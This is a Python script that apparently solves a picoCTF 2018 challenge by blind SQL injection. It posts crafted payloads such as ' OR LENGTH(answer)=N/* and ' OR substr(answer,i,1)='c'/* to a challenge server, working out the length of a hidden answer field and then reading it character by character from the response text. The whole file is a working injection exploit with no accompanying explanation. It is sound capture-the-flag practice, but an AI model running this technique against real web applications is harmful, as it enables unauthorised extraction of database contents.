#!/usr/bin/env python3
import requests
import string
length = 1
while True:
	payload = "' OR LENGTH(answer)=%d/*"%length
	r = requests.post("http://2018shell1.picoctf.com:32635/answer2.php",data={"answer":payload})
	if "Wrong" in r.text:
		length+=1
	else:
		break
print("Answer length=%d"%length)
answer = ""
print("Reading answer: ")
for i in range(length):
	for c in string.ascii_lowercase+string.ascii_uppercase+string.digits:
		payload = "' OR substr(answer,%d,1)='%s'/*"%(i+1,c)
		r = requests.post("http://2018shell1.picoctf.com:32635/answer2.php",data={"answer":payload})
		if "are so close" in r.text:
			answer+=c
			print(answer)
			break
print("Answer: %s"%answer)